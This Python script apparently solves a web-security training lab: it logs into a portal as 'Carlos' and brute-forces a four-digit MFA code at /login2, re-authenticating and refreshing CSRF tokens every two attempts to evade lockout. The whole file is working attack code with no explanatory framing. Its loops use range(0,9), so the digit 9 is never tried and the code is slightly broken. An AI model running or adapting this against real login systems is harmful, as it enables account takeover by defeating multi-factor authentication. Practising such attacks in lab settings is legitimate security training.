import requests
from bs4 import BeautifulSoup

portalurl = ''
username = ""
password = ""

isVerify=True

def GetCsrfToken(url, session):
    print("[i] Getting CSRT Token..")
 
    if session == None:
        response = requests.get(portalurl + url,verify=isVerify)
    else:
        headers = { 'Cookie':session }
        response = requests.get(portalurl + url,headers=headers,verify=isVerify)
    soup = BeautifulSoup(response.content.decode("utf-8"), 'html.parser')

    for input in soup.find_all('input'):
        inputName = input.get('name')
        if inputName == "csrf":
            if session == None:
                return { 'token': '' + input.get('value'), 'session': response.cookies.get('session') }
            else:
                return { 'token': '' + input.get('value'), 'session': session }

    print("reply " + str(response.status_code))
    return 

def Login(token, session):
    print("[i] Logining into " + username)

    data = "csrf=" + token + "&username=" + username  + "&password=" +  password
    headers = { 'Cookie': "session=" + session }
    response = requests.post(portalurl + '/login',  data=data, headers=headers, verify=isVerify, allow_redirects=False)

    if response.status_code == 302:
        print("[i] Logged in as Carlos!")
        return { 'session' : response.headers.get("set-cookie") }
    else:
        print(str(response.status_code) )
        return 

def BruteForce(oldSession, newToken):
 
    print("[!] Brute forcing...")

    newCsrfToken = GetCsrfToken("/login2", oldSession)
    token = newCsrfToken.get('token')

    print("[+] New Token: " + token)
    count = 0

    for one in range(0,9):
        for two in range(0,9):
            for three in range(0,9):
                for four in range(0,9):
                    data = 'csrf=' + token + '&' + 'mfa-code=' + str(one) + str(two) + str(three) + str(four)
                    headers = { 'Cookie': oldSession}
                    response = requests.post(portalurl + "/login2",data=data,headers=headers,verify=isVerify)
                    if (response.status_code == 200):
                        if "Incorrect security code".lower()  not in response.content.decode("utf-8").lower():
                            print("[+] Success! Redirecting to account page!")
                            response = requests.get(portalurl + "/myaccount",verify=True)
                            return True
                        count = count + 1
                        if count == 2:
                            count = 0
                            oldSession = response.headers.get("set-cookie")
                            soup = BeautifulSoup(response.content.decode("utf-8"), 'html.parser')

                            for input in soup.find_all('input'):
                               inputName = input.get('name')
                               if inputName == "csrf":
                                token = input.get('value')
                                nSession = response.headers.get("set-cookie")
                                if nSession:
                                    oldSession = nSession
                                    print("[+] New session: " + oldSession)

                                cookieArray = oldSession.split(";")

                                sessionCookie = cookieArray[0].split('=')

                                newSessionToken = Login(token, sessionCookie[1])

                                if newSessionToken:
                                    newCsrfToken = GetCsrfToken("/login2", newSessionToken.get('session') )
                                    token = newCsrfToken.get('token')
                                    oldSession = newSessionToken.get('session')
                                break
                    elif (response.status_code == 302):
                        print("[+] Success! Redirecting to account page!")
                        response = requests.get(portalurl + "/myaccount",verify=True)
                        return True
                    else:
                        print("[+] Error Token expired or page expired!")
                        exit()
    return False
if __name__ == '__main__':
    csrfToken = GetCsrfToken("/login", None)
    if csrfToken:
        print("[+] Session: " + csrfToken.get('session'))
        print("[+] CSRF Token: " + csrfToken.get('token'))

        newSessionToken = Login(csrfToken.get('token'), csrfToken.get('session'))
        print("[+] New Session: " +  newSessionToken.get('session'))
        if BruteForce(newSessionToken.get('session'), newSessionToken.get('newToken') ):
            print("[+] Done")
        else:
            print("[-] Unable to crack code.")
        
    else:
        print("[!] Error token not found!")

